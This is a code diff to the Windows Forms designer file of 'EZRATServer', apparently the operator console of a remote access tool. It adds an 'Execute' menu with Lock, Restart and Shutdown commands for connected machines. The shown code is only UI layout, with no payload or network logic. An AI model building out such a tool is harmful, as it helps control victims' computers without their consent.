@@ -40,7 +40,12 @@
             this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.imageContextMenu1 = new EZRATServer.Utils.ImageContextMenu();
+            this.menuExecute = new System.Windows.Forms.ToolStripMenuItem();
+            this.exeLock = new System.Windows.Forms.ToolStripMenuItem();
+            this.exeRestart = new System.Windows.Forms.ToolStripMenuItem();
+            this.exeShutdown = new System.Windows.Forms.ToolStripMenuItem();
             this.panTools.SuspendLayout();
+            this.imageContextMenu1.SuspendLayout();
             this.SuspendLayout();
             // 
             // panTools
@@ -141,8 +146,42 @@
             // 
             // imageContextMenu1
             // 
+            this.imageContextMenu1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.menuExecute});
             this.imageContextMenu1.Name = "imageContextMenu1";
-            this.imageContextMenu1.Size = new System.Drawing.Size(153, 70);
+            this.imageContextMenu1.Size = new System.Drawing.Size(153, 158);
+            // 
+            // menuExecute
+            // 
+            this.menuExecute.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.exeLock,
+            this.exeRestart,
+            this.exeShutdown});
+            this.menuExecute.Image = global::EZRATServer.Properties.Resources.UAC;
+            this.menuExecute.Name = "menuExecute";
+            this.menuExecute.Size = new System.Drawing.Size(152, 22);
+            this.menuExecute.Text = "Execute";
+            // 
+            // exeLock
+            // 
+            this.exeLock.Image = global::EZRATServer.Properties.Resources.locked;
+            this.exeLock.Name = "exeLock";
+            this.exeLock.Size = new System.Drawing.Size(180, 22);
+            this.exeLock.Text = "Lock";
+            // 
+            // exeRestart
+            // 
+            this.exeRestart.Image = global::EZRATServer.Properties.Resources.restart;
+            this.exeRestart.Name = "exeRestart";
+            this.exeRestart.Size = new System.Drawing.Size(180, 22);
+            this.exeRestart.Text = "Restart";
+            // 
+            // exeShutdown
+            // 
+            this.exeShutdown.Image = global::EZRATServer.Properties.Resources.shutdown;
+            this.exeShutdown.Name = "exeShutdown";
+            this.exeShutdown.Size = new System.Drawing.Size(180, 22);
+            this.exeShutdown.Text = "Shutdown";
             // 
             // Server
             // 
@@ -156,6 +195,7 @@
             this.Name = "Server";
             this.Text = "Server EZRAT";
             this.panTools.ResumeLayout(false);
+            this.imageContextMenu1.ResumeLayout(false);
             this.ResumeLayout(false);
 
         }
@@ -180,6 +220,10 @@
         private System.Windows.Forms.ColumnHeader columnHeader8;
         private System.Windows.Forms.ColumnHeader columnHeader9;
         private System.Windows.Forms.ColumnHeader columnHeader10;
+        private System.Windows.Forms.ToolStripMenuItem menuExecute;
+        private System.Windows.Forms.ToolStripMenuItem exeLock;
+        private System.Windows.Forms.ToolStripMenuItem exeRestart;
+        private System.Windows.Forms.ToolStripMenuItem exeShutdown;
     }
 }
 
